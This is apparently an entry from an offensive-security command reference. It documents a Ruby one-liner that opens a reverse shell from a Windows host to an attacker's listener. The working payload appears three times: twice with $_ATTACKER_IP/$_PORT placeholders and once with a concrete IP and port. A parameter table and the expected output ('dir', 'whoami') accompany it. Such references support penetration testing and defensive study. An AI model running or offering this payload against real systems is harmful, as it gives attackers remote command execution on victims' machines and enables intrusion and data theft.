---
type: command
executor: bash
data: >-
  ruby -rsocket -e
  'c=TCPSocket.new("$_ATTACKER_IP","$_PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
  io.read}end'
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Windows
tags:
  - reverse-shell
  - ruby
verified: true
validated: true
---

# ruby-remote-command-execution-windows

## Command

```bash
ruby -rsocket -e 'c=TCPSocket.new("$_ATTACKER_IP","$_PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Description

This Windows-specific command creates a reverse connection for executing individual commands sent from the attacker, using a while loop to process input continuously.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the attacker's listener | Yes |
| $_PORT | Port on which the attacker is listening | Yes |
| -rsocket | Loads Ruby's socket library | Built-in |
| -e | Executes the following Ruby expression | Built-in |

## Examples

### Basic Usage

```bash
ruby -rsocket -e 'c=TCPSocket.new("192.168.1.100","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Advanced Usage

Send Windows commands like `dir` or `whoami` via the listener; no native exit, terminate via process kill.

## Expected Output

Listener receives outputs like directory contents for `dir C:\` or user info for `whoami`. Runs indefinitely until interrupted.

## Related

- [[procedures/Establish-Ruby-Reverse-Shell]]
- [[commands/ruby-remote-command-execution-unix]]
